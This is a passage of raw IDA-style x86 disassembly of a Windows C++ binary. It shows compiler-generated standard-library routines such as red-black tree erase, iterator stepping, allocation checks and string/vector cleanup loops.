                add     esp, 4
                add     esp, 10h
                retn
; ---------------------------------------------------------------------------

loc_40A9DD:                             ; CODE XREF: sub_40A9C0+5↑j
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     ecx
                cmp     eax, 4
                jnb     short loc_40A9C9
                lea     eax, [esp+10h+var_10]
                push    eax
                lea     ecx, [esp+14h+var_C]
                mov     [esp+14h+var_10], 0
                call    sub_40E649
                push    offset unk_42337C
                lea     ecx, [esp+14h+var_C]
                push    ecx
                mov     [esp+18h+var_C], offset off_420260
                call    sub_41032B
sub_40A9C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AA20      proc near               ; CODE XREF: sub_40A430+120↑p

var_50          = byte ptr -50h
var_4C          = byte ptr -4Ch
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = byte ptr  0Ch
arg_C           = dword ptr  10h

                push    0FFFFFFFFh
                push    offset SEH_40AA20
                mov     eax, large fs:0
                push    eax
                sub     esp, 44h
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+64h+var_C]
                mov     large fs:0, eax
                mov     ebp, [esp+64h+arg_C]
                cmp     byte ptr [ebp+45h], 0
                jz      short loc_40AA9D
                push    1Bh
                xor     esi, esi
                push    offset aInvalidMapSetT ; "invalid map/set<T> iterator"
                lea     ecx, [esp+6Ch+var_50]
                mov     [esp+6Ch+var_38], 0Fh
                mov     [esp+6Ch+var_3C], esi
                mov     [esp+6Ch+var_4C], 0
                call    sub_409840
                lea     eax, [esp+64h+var_50]
                push    eax
                lea     ecx, [esp+68h+var_34]
                mov     [esp+68h+var_4], esi
                call    sub_4010D0
                push    offset unk_423308
                lea     ecx, [esp+68h+var_34]
                push    ecx
                mov     [esp+6Ch+var_34], offset off_420284
                call    sub_41032B

loc_40AA9D:                             ; CODE XREF: sub_40AA20+2F↑j
                lea     esi, [esp+64h+arg_8]
                call    sub_40AE80
                mov     ecx, [ebp+0]
                cmp     byte ptr [ecx+45h], 0
                jz      short loc_40AAB4
                mov     edi, [ebp+8]
                jmp     short loc_40AACF
; ---------------------------------------------------------------------------

loc_40AAB4:                             ; CODE XREF: sub_40AA20+8D↑j
                mov     edx, [ebp+8]
                cmp     byte ptr [edx+45h], 0
                jz      short loc_40AAC1
                mov     edi, ecx
                jmp     short loc_40AACF
; ---------------------------------------------------------------------------

loc_40AAC1:                             ; CODE XREF: sub_40AA20+9B↑j
                mov     eax, [esp+64h+arg_C]
                mov     edi, [eax+8]
                lea     edx, [eax+8]
                cmp     eax, ebp
                jnz     short loc_40AB47

loc_40AACF:                             ; CODE XREF: sub_40AA20+92↑j
                                        ; sub_40AA20+9F↑j
                cmp     byte ptr [edi+45h], 0
                mov     esi, [ebp+4]
                jnz     short loc_40AADB
                mov     [edi+4], esi

loc_40AADB:                             ; CODE XREF: sub_40AA20+B6↑j
                mov     edx, [esp+64h+arg_0]
                mov     eax, [edx+18h]
                cmp     [eax+4], ebp
                jnz     short loc_40AAEC
                mov     [eax+4], edi
                jmp     short loc_40AAF7
; ---------------------------------------------------------------------------

loc_40AAEC:                             ; CODE XREF: sub_40AA20+C5↑j
                cmp     [esi], ebp
                jnz     short loc_40AAF4
                mov     [esi], edi
                jmp     short loc_40AAF7
; ---------------------------------------------------------------------------

loc_40AAF4:                             ; CODE XREF: sub_40AA20+CE↑j
                mov     [esi+8], edi

loc_40AAF7:                             ; CODE XREF: sub_40AA20+CA↑j
                                        ; sub_40AA20+D2↑j
                mov     ebx, [edx+18h]
                cmp     [ebx], ebp
                jnz     short loc_40AB1E
                cmp     byte ptr [edi+45h], 0
                jz      short loc_40AB08
                mov     ecx, esi
                jmp     short loc_40AB1C
; ---------------------------------------------------------------------------

loc_40AB08:                             ; CODE XREF: sub_40AA20+E2↑j
                mov     eax, [edi]
                cmp     byte ptr [eax+45h], 0
                mov     ecx, edi
                jnz     short loc_40AB1C

loc_40AB12:                             ; CODE XREF: sub_40AA20+FA↓j
                mov     ecx, eax
                mov     eax, [ecx]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40AB12

loc_40AB1C:                             ; CODE XREF: sub_40AA20+E6↑j
                                        ; sub_40AA20+F0↑j
                mov     [ebx], ecx

loc_40AB1E:                             ; CODE XREF: sub_40AA20+DC↑j
                mov     ebx, [edx+18h]
                cmp     [ebx+8], ebp
                jnz     loc_40ABAC
                cmp     byte ptr [edi+45h], 0
                jz      short loc_40AB37
                mov     eax, esi
                mov     [ebx+8], eax
                jmp     short loc_40ABAC
; ---------------------------------------------------------------------------

loc_40AB37:                             ; CODE XREF: sub_40AA20+10E↑j
                mov     eax, edi
                call    sub_40AE60
                mov     edx, [esp+64h+arg_0]
                mov     [ebx+8], eax
                jmp     short loc_40ABAC
; ---------------------------------------------------------------------------

loc_40AB47:                             ; CODE XREF: sub_40AA20+AD↑j
                mov     [ecx+4], eax
                mov     ecx, [ebp+0]
                mov     [eax], ecx
                cmp     eax, [ebp+8]
                jnz     short loc_40AB58
                mov     esi, eax
                jmp     short loc_40AB71
; ---------------------------------------------------------------------------

loc_40AB58:                             ; CODE XREF: sub_40AA20+132↑j
                cmp     byte ptr [edi+45h], 0
                mov     esi, [eax+4]
                jnz     short loc_40AB64
                mov     [edi+4], esi

loc_40AB64:                             ; CODE XREF: sub_40AA20+13F↑j
                mov     [esi], edi
                mov     ecx, [ebp+8]
                mov     [edx], ecx
                mov     edx, [ebp+8]
                mov     [edx+4], eax

loc_40AB71:                             ; CODE XREF: sub_40AA20+136↑j
                mov     ecx, [esp+64h+arg_0]
                mov     ecx, [ecx+18h]
                cmp     [ecx+4], ebp
                jnz     short loc_40AB82
                mov     [ecx+4], eax
                jmp     short loc_40AB90
; ---------------------------------------------------------------------------

loc_40AB82:                             ; CODE XREF: sub_40AA20+15B↑j
                mov     ecx, [ebp+4]
                cmp     [ecx], ebp
                jnz     short loc_40AB8D
                mov     [ecx], eax
                jmp     short loc_40AB90
; ---------------------------------------------------------------------------

loc_40AB8D:                             ; CODE XREF: sub_40AA20+167↑j
                mov     [ecx+8], eax

loc_40AB90:                             ; CODE XREF: sub_40AA20+160↑j
                                        ; sub_40AA20+16B↑j
                mov     edx, [ebp+4]
                mov     [eax+4], edx
                lea     ecx, [ebp+44h]
                add     eax, 44h
                cmp     eax, ecx
                jz      short loc_40ABA8
                mov     bl, [ecx]
                mov     dl, [eax]
                mov     [eax], bl
                mov     [ecx], dl

loc_40ABA8:                             ; CODE XREF: sub_40AA20+17E↑j
                mov     edx, [esp+64h+arg_0]

loc_40ABAC:                             ; CODE XREF: sub_40AA20+104↑j
                                        ; sub_40AA20+115↑j ...
                mov     bl, 1
                cmp     [ebp+44h], bl
                jnz     loc_40ACBA
                mov     eax, [edx+18h]
                cmp     edi, [eax+4]
                jz      loc_40ACB7

loc_40ABC3:                             ; CODE XREF: sub_40AA20+25C↓j
                cmp     [edi+44h], bl
                jnz     loc_40ACB7
                mov     ecx, [esi]
                cmp     edi, ecx
                jnz     short loc_40AC3D
                mov     ecx, [esi+8]
                cmp     byte ptr [ecx+44h], 0
                jnz     short loc_40ABF1
                mov     [ecx+44h], bl
                push    edx
                mov     ecx, esi
                mov     byte ptr [esi+44h], 0
                call    sub_40A690
                mov     ecx, [esi+8]
                mov     edx, [esp+64h+arg_0]

loc_40ABF1:                             ; CODE XREF: sub_40AA20+1B9↑j
                cmp     byte ptr [ecx+45h], 0
                jnz     short loc_40AC71
                mov     eax, [ecx]
                cmp     [eax+44h], bl
                jnz     short loc_40AC06
                mov     eax, [ecx+8]
                cmp     [eax+44h], bl
                jz      short loc_40AC6D

loc_40AC06:                             ; CODE XREF: sub_40AA20+1DC↑j
                mov     eax, [ecx+8]
                cmp     [eax+44h], bl
                jnz     short loc_40AC24
                mov     eax, [ecx]
                mov     [eax+44h], bl
                push    edx
                mov     byte ptr [ecx+44h], 0
                call    sub_40A6E0
                mov     ecx, [esi+8]
                mov     edx, [esp+64h+arg_0]

loc_40AC24:                             ; CODE XREF: sub_40AA20+1EC↑j
                mov     al, [esi+44h]
                mov     [ecx+44h], al
                mov     [esi+44h], bl
                mov     ecx, [ecx+8]
                mov     [ecx+44h], bl
                push    edx
                mov     ecx, esi
                call    sub_40A690
                jmp     short loc_40ACB7
; ---------------------------------------------------------------------------

loc_40AC3D:                             ; CODE XREF: sub_40AA20+1B0↑j
                cmp     byte ptr [ecx+44h], 0
                jnz     short loc_40AC58
                mov     [ecx+44h], bl
                push    edx
                mov     ecx, esi
                mov     byte ptr [esi+44h], 0
                call    sub_40A6E0
                mov     ecx, [esi]
                mov     edx, [esp+64h+arg_0]

loc_40AC58:                             ; CODE XREF: sub_40AA20+221↑j
                cmp     byte ptr [ecx+45h], 0
                jnz     short loc_40AC71
                mov     eax, [ecx+8]
                cmp     [eax+44h], bl
                jnz     short loc_40AC84
                mov     eax, [ecx]
                cmp     [eax+44h], bl
                jnz     short loc_40AC84

loc_40AC6D:                             ; CODE XREF: sub_40AA20+1E4↑j
                mov     byte ptr [ecx+44h], 0

loc_40AC71:                             ; CODE XREF: sub_40AA20+1D5↑j
                                        ; sub_40AA20+23C↑j
                mov     ecx, [edx+18h]
                mov     edi, esi
                mov     esi, [esi+4]
                cmp     edi, [ecx+4]
                jnz     loc_40ABC3
                jmp     short loc_40ACB7
; ---------------------------------------------------------------------------

loc_40AC84:                             ; CODE XREF: sub_40AA20+244↑j
                                        ; sub_40AA20+24B↑j
                mov     eax, [ecx]
                cmp     [eax+44h], bl
                jnz     short loc_40ACA1
                mov     eax, [ecx+8]
                mov     [eax+44h], bl
                push    edx
                mov     byte ptr [ecx+44h], 0
                call    sub_40A690
                mov     ecx, [esi]
                mov     edx, [esp+64h+arg_0]

loc_40ACA1:                             ; CODE XREF: sub_40AA20+269↑j
                mov     al, [esi+44h]
                mov     [ecx+44h], al
                mov     [esi+44h], bl
                mov     ecx, [ecx]
                mov     [ecx+44h], bl
                push    edx
                mov     ecx, esi
                call    sub_40A6E0

loc_40ACB7:                             ; CODE XREF: sub_40AA20+19D↑j
                                        ; sub_40AA20+1A6↑j ...
                mov     [edi+44h], bl

loc_40ACBA:                             ; CODE XREF: sub_40AA20+191↑j
                mov     ebx, 10h
                cmp     [ebp+40h], ebx
                jb      short loc_40ACD0
                mov     edx, [ebp+2Ch]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_40ACD0:                             ; CODE XREF: sub_40AA20+2A2↑j
                xor     esi, esi
                mov     edi, 0Fh
                mov     [ebp+40h], edi
                mov     [ebp+3Ch], esi
                mov     byte ptr [ebp+2Ch], 0
                cmp     [ebp+24h], ebx
                jb      short loc_40ACF2
                mov     eax, [ebp+10h]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40ACF2:                             ; CODE XREF: sub_40AA20+2C4↑j
                mov     [ebp+24h], edi
                mov     [ebp+20h], esi
                push    ebp
                mov     byte ptr [ebp+10h], 0
                call    sub_40F15B
                mov     ecx, [esp+68h+arg_0]
                mov     eax, [ecx+1Ch]
                add     esp, 4
                cmp     eax, esi
                jbe     short loc_40AD14
                dec     eax
                mov     [ecx+1Ch], eax

loc_40AD14:                             ; CODE XREF: sub_40AA20+2EE↑j
                mov     edx, [esp+64h+arg_4]
                mov     eax, [esp+64h+arg_C]
                mov     ecx, [ecx]
                mov     [edx+4], eax
                mov     [edx], ecx
                mov     eax, edx
                mov     ecx, [esp+64h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 50h
                retn    10h
sub_40AA20      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AD40      proc near               ; CODE XREF: sub_4091F0+43↑p
                push    48h
                call    sub_40F94F
                add     esp, 4
                test    eax, eax
                jz      short loc_40AD54
                mov     dword ptr [eax], 0

loc_40AD54:                             ; CODE XREF: sub_40AD40+C↑j
                lea     ecx, [eax+4]
                test    ecx, ecx
                jz      short loc_40AD61
                mov     dword ptr [ecx], 0

loc_40AD61:                             ; CODE XREF: sub_40AD40+19↑j
                lea     ecx, [eax+8]
                test    ecx, ecx
                jz      short loc_40AD6E
                mov     dword ptr [ecx], 0

loc_40AD6E:                             ; CODE XREF: sub_40AD40+26↑j
                mov     byte ptr [eax+44h], 1
                mov     byte ptr [eax+45h], 0
                retn
sub_40AD40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AD80      proc near               ; CODE XREF: sub_4088F0+185↑p
                cmp     dword ptr [esi], 0
                jnz     short loc_40AD8A
                call    sub_40EC7A

loc_40AD8A:                             ; CODE XREF: sub_40AD80+3↑j
                mov     eax, [esi+4]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40ADA4
                mov     eax, [eax+8]
                mov     [esi+4], eax
                cmp     byte ptr [eax+45h], 0
                jz      short locret_40ADF6
                jmp     sub_40EC7A
; ---------------------------------------------------------------------------

loc_40ADA4:                             ; CODE XREF: sub_40AD80+11↑j
                mov     ecx, [eax]
                cmp     byte ptr [ecx+45h], 0
                jnz     short loc_40ADC4
                mov     eax, [ecx+8]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40ADC0

loc_40ADB5:                             ; CODE XREF: sub_40AD80+3E↓j
                mov     ecx, eax
                mov     eax, [ecx+8]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40ADB5

loc_40ADC0:                             ; CODE XREF: sub_40AD80+33↑j
                mov     [esi+4], ecx
                retn
; ---------------------------------------------------------------------------

loc_40ADC4:                             ; CODE XREF: sub_40AD80+2A↑j
                mov     eax, [eax+4]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40ADE5
                lea     ecx, [ecx+0]

loc_40ADD0:                             ; CODE XREF: sub_40AD80+63↓j
                mov     ecx, [esi+4]
                cmp     ecx, [eax]
                jnz     short loc_40ADE5
                mov     [esi+4], eax
                mov     edx, eax
                mov     eax, [edx+4]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40ADD0

loc_40ADE5:                             ; CODE XREF: sub_40AD80+4B↑j
                                        ; sub_40AD80+55↑j
                mov     ecx, [esi+4]
                cmp     byte ptr [ecx+45h], 0
                jz      short loc_40ADF3
                jmp     sub_40EC7A
; ---------------------------------------------------------------------------

loc_40ADF3:                             ; CODE XREF: sub_40AD80+6C↑j
                mov     [esi+4], eax

locret_40ADF6:                          ; CODE XREF: sub_40AD80+1D↑j
                retn
sub_40AD80      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AE00      proc near               ; CODE XREF: sub_40A7D0+C1↑p

var_C           = dword ptr -0Ch
arg_0           = dword ptr  4

                mov     ecx, [esp+arg_0]
                sub     esp, 0Ch
                test    ecx, ecx
                ja      short loc_40AE1C
                xor     ecx, ecx

loc_40AE0D:                             ; CODE XREF: sub_40AE00+26↓j
                push    ecx
                call    sub_40F94F
                add     esp, 4
                add     esp, 0Ch
                retn    4
; ---------------------------------------------------------------------------

loc_40AE1C:                             ; CODE XREF: sub_40AE00+9↑j
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     ecx
                cmp     eax, 1
                jnb     short loc_40AE0D
                lea     eax, [esp+0Ch+arg_0]
                push    eax
                lea     ecx, [esp+10h+var_C]
                mov     [esp+10h+arg_0], 0
                call    sub_40E649
                push    offset unk_42337C
                lea     ecx, [esp+10h+var_C]
                push    ecx
                mov     [esp+14h+var_C], offset off_420260
                call    sub_41032B
sub_40AE00      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AE60      proc near               ; CODE XREF: sub_40AA20+119↑p
                mov     ecx, [eax+8]
                cmp     byte ptr [ecx+45h], 0
                jnz     short locret_40AE7B
                lea     esp, [esp+0]

loc_40AE70:                             ; CODE XREF: sub_40AE60+19↓j
                mov     eax, ecx
                mov     ecx, [eax+8]
                cmp     byte ptr [ecx+45h], 0
                jz      short loc_40AE70

locret_40AE7B:                          ; CODE XREF: sub_40AE60+7↑j
                retn
sub_40AE60      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AE80      proc near               ; CODE XREF: sub_40AA20+81↑p
                cmp     dword ptr [esi], 0
                jnz     short loc_40AE8A
                call    sub_40EC7A

loc_40AE8A:                             ; CODE XREF: sub_40AE80+3↑j
                mov     eax, [esi+4]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40AE98
                jmp     sub_40EC7A
; ---------------------------------------------------------------------------

loc_40AE98:                             ; CODE XREF: sub_40AE80+11↑j
                mov     ecx, [eax+8]
                cmp     byte ptr [ecx+45h], 0
                jnz     short loc_40AEBE
                mov     eax, [ecx]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40AEBA
                lea     esp, [esp+0]

loc_40AEB0:                             ; CODE XREF: sub_40AE80+38↓j
                mov     ecx, eax
                mov     eax, [ecx]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40AEB0

loc_40AEBA:                             ; CODE XREF: sub_40AE80+27↑j
                mov     [esi+4], ecx
                retn
; ---------------------------------------------------------------------------

loc_40AEBE:                             ; CODE XREF: sub_40AE80+1F↑j
                mov     eax, [eax+4]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40AEDD

loc_40AEC7:                             ; CODE XREF: sub_40AE80+5B↓j
                mov     ecx, [esi+4]
                cmp     ecx, [eax+8]
                jnz     short loc_40AEDD
                mov     [esi+4], eax
                mov     edx, eax
                mov     eax, [edx+4]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40AEC7

loc_40AEDD:                             ; CODE XREF: sub_40AE80+45↑j
                                        ; sub_40AE80+4D↑j
                mov     [esi+4], eax
                retn
sub_40AE80      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AEF0      proc near               ; CODE XREF: sub_407940+2F6↑p
                                        ; sub_407940+467↑p ...

var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    0FFFFFFFFh
                push    offset SEH_40AEF0
                mov     eax, large fs:0
                push    eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+18h+var_C]
                mov     large fs:0, eax
                mov     esi, [esp+18h+arg_0]
                xor     ebx, ebx
                push    0FFFFFFFFh
                push    ebx
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                push    edi
                mov     ecx, esi
                mov     [esi+4], bl
                call    sub_408CA0
                push    0FFFFFFFFh
                lea     ecx, [esi+1Ch]
                mov     [esp+1Ch+var_4], ebx
                lea     eax, [edi+1Ch]
                push    ebx
                mov     dword ptr [ecx+18h], 0Fh
                mov     [ecx+14h], ebx
                push    eax
                mov     [ecx+4], bl
                call    sub_408CA0
                mov     eax, esi
                mov     ecx, [esp+18h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                add     esp, 0Ch
                retn    4
sub_40AEF0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AF70      proc near               ; CODE XREF: sub_4099D0+323↑p

arg_0           = dword ptr  4

                push    ecx
                push    ebx
                push    ebp
                mov     ebp, [esp+0Ch+arg_0]
                push    esi
                mov     esi, eax
                mov     ecx, esi
                sub     ecx, edi
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                lea     eax, [eax+eax*2]
                add     eax, eax
                add     eax, eax
                add     eax, eax
                mov     ebx, ebp
                sub     ebx, eax
                cmp     edi, esi
                jz      short loc_40AFB4
                sub     ebp, esi

loc_40AFA2:                             ; CODE XREF: sub_40AF70+42↓j
                sub     esi, 18h
                lea     ecx, [esi+ebp]
                push    ecx
                mov     edx, esi
                call    sub_40B900
                cmp     esi, edi
                jnz     short loc_40AFA2

loc_40AFB4:                             ; CODE XREF: sub_40AF70+2E↑j
                pop     esi
                pop     ebp
                mov     eax, ebx
                pop     ebx
                pop     ecx
                retn
sub_40AF70      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AFC0      proc near               ; CODE XREF: sub_40A030+2D2↑p
                                        ; sub_40A030+347↑p
                push    esi
                mov     esi, eax
                cmp     esi, edi
                jz      short loc_40AFDA

loc_40AFC7:                             ; CODE XREF: sub_40AFC0+18↓j
                push    0FFFFFFFFh
                push    0
                push    ebx
                mov     ecx, esi
                call    sub_408CA0
                add     esi, 1Ch
                cmp     esi, edi
                jnz     short loc_40AFC7

loc_40AFDA:                             ; CODE XREF: sub_40AFC0+5↑j
                pop     esi
                retn
sub_40AFC0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40AFE0      proc near               ; CODE XREF: sub_40A030+339↑p

var_4           = dword ptr -4

                push    ecx
                push    esi
                mov     esi, eax
                mov     byte ptr [esp+8+var_4], 0
                mov     eax, [esp+8+var_4]
                mov     ecx, [esp+8+var_4]
                mov     edx, [esp+8+var_4]
                push    eax
                push    ecx
                push    edx
                push    edi
                push    ebx
                mov     ecx, esi
                call    sub_40B7F0
                sub     esi, ebx
                mov     eax, 92492493h
                imul    esi
                add     edx, esi
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                lea     ecx, ds:0[eax*8]
                sub     ecx, eax
                add     ecx, ecx
                add     esp, 14h
                add     ecx, ecx
                mov     eax, edi
                sub     eax, ecx
                pop     esi
                pop     ecx
                retn
sub_40AFE0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B030      proc near               ; CODE XREF: sub_40F94F+51↓p
                                        ; DATA XREF: .rdata:0042336C↓o

arg_0           = dword ptr  4

                mov     eax, [esp+arg_0]
                push    esi
                push    eax
                mov     esi, ecx
                call    sub_40E6B9
                mov     dword ptr [esi], offset off_420260
                mov     eax, esi
                pop     esi
                retn    4
sub_40B030      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40B050      proc near               ; CODE XREF: sub_4086A0+61↑p
                                        ; sub_4099D0+EF↑p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40B050
                mov     eax, large fs:0
                push    eax
                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     edi, ecx
                mov     esi, [ebp+arg_0]
                xor     ebx, ebx
                mov     [ebp+var_14], esi
                mov     [ebp+var_4], ebx

loc_40B088:                             ; CODE XREF: sub_40B050+57↓j
                cmp     edi, ebx
                jbe     short loc_40B0C8
                mov     byte ptr [ebp+var_4], 1
                cmp     esi, ebx
                jz      short loc_40B09D
                mov     ecx, [ebp+arg_4]
                push    esi
                call    sub_408740

loc_40B09D:                             ; CODE XREF: sub_40B050+42↑j
                dec     edi
                add     esi, 18h
                mov     byte ptr [ebp+var_4], bl
                mov     [ebp+arg_0], esi
                jmp     short loc_40B088
; ---------------------------------------------------------------------------

loc_40B0A9:                             ; DATA XREF: .rdata:stru_423BC4↓o
                mov     esi, [ebp+var_14]
                mov     edi, [ebp+arg_0]
                cmp     esi, edi
                jz      short loc_40B0BF

loc_40B0B3:                             ; CODE XREF: sub_40B050+6D↓j
                call    sub_40B240
                add     esi, 18h
                cmp     esi, edi
                jnz     short loc_40B0B3

loc_40B0BF:                             ; CODE XREF: sub_40B050+61↑j
                xor     ebx, ebx
                push    ebx
                push    ebx
                call    sub_41032B

loc_40B0C8:                             ; CODE XREF: sub_40B050+3A↑j
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_40B050      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40B0E0      proc near               ; CODE XREF: sub_408850+61↑p
                                        ; sub_40A030+FE↑p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40B0E0
                mov     eax, large fs:0
                push    eax
                sub     esp, 8
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     edi, ecx
                mov     esi, [ebp+arg_0]
                xor     ebx, ebx
                mov     [ebp+var_14], esi
                mov     [ebp+var_4], ebx

loc_40B118:                             ; CODE XREF: sub_40B0E0+69↓j
                cmp     edi, ebx
                jbe     short loc_40B16A
                mov     byte ptr [ebp+var_4], 1
                cmp     esi, ebx
                jz      short loc_40B13F
                mov     eax, [ebp+arg_4]
                push    0FFFFFFFFh
                push    ebx
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                push    eax
                mov     ecx, esi
                mov     [esi+4], bl
                call    sub_408CA0

loc_40B13F:                             ; CODE XREF: sub_40B0E0+42↑j
                dec     edi
                add     esi, 1Ch
                mov     byte ptr [ebp+var_4], bl
                mov     [ebp+arg_0], esi
                jmp     short loc_40B118
; ---------------------------------------------------------------------------

loc_40B14B:                             ; DATA XREF: .rdata:stru_423698↓o
                mov     esi, [ebp+var_14]
                mov     edi, [ebp+arg_0]
                cmp     esi, edi
                jz      short loc_40B161

loc_40B155:                             ; CODE XREF: sub_40B0E0+7F↓j
                call    sub_40A000
                add     esi, 1Ch
                cmp     esi, edi
                jnz     short loc_40B155

loc_40B161:                             ; CODE XREF: sub_40B0E0+73↑j
                xor     ebx, ebx
                push    ebx
                push    ebx
                call    sub_41032B

loc_40B16A:                             ; CODE XREF: sub_40B0E0+3A↑j
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_40B0E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B180      proc near               ; CODE XREF: sub_4099B0+A↑p
                                        ; sub_4099D0+17D↑p ...

arg_0           = dword ptr  4

                push    edi
                mov     edi, eax
                cmp     edi, [esp+4+arg_0]
                jz      short loc_40B1F2
                push    ebx
                push    ebp
                push    esi
                xor     ebx, ebx
                mov     edi, edi

loc_40B190:                             ; CODE XREF: sub_40B180+6D↓j
                mov     esi, [edi+0Ch]
                cmp     esi, ebx
                jz      short loc_40B1D2
                mov     ebp, [edi+10h]
                cmp     esi, ebp
                jz      short loc_40B1C6
                mov     edi, edi

loc_40B1A0:                             ; CODE XREF: sub_40B180+44↓j
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_40B1B2
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40B1B2:                             ; CODE XREF: sub_40B180+24↑j
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                mov     [esi+4], bl
                add     esi, 1Ch
                cmp     esi, ebp
                jnz     short loc_40B1A0

loc_40B1C6:                             ; CODE XREF: sub_40B180+1C↑j
                mov     ecx, [edi+0Ch]
                push    ecx
                call    sub_40F15B
                add     esp, 4

loc_40B1D2:                             ; CODE XREF: sub_40B180+15↑j
                mov     edx, [edi]
                push    edx
                mov     [edi+0Ch], ebx
                mov     [edi+10h], ebx
                mov     [edi+14h], ebx
                call    sub_40F15B
                add     edi, 18h
                add     esp, 4
                cmp     edi, [esp+10h+arg_0]
                jnz     short loc_40B190
                pop     esi
                pop     ebp
                pop     ebx

loc_40B1F2:                             ; CODE XREF: sub_40B180+7↑j
                pop     edi
                retn
sub_40B180      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B200      proc near               ; CODE XREF: sub_403B80+318↑p
                                        ; sub_403B80+39E↑p ...
                push    esi
                mov     esi, eax
                cmp     esi, edi
                jz      short loc_40B237
                push    ebx
                xor     ebx, ebx
                lea     ebx, [ebx+0]

loc_40B210:                             ; CODE XREF: sub_40B200+34↓j
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_40B222
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40B222:                             ; CODE XREF: sub_40B200+14↑j
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                mov     [esi+4], bl
                add     esi, 1Ch
                cmp     esi, edi
                jnz     short loc_40B210
                pop     ebx

loc_40B237:                             ; CODE XREF: sub_40B200+5↑j
                pop     esi
                retn
sub_40B200      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40B240      proc near               ; CODE XREF: sub_4099D0:loc_409D18↑p
                                        ; sub_40B050:loc_40B0B3↑p ...

var_4           = dword ptr -4

                push    ecx
                mov     eax, [esi+0Ch]
                test    eax, eax
                jz      short loc_40B262
                mov     ecx, [esp+4+var_4]
                push    edi
                mov     edi, [esi+10h]
                push    ecx
                call    sub_40B200
                mov     edx, [esi+0Ch]
                push    edx
                call    sub_40F15B
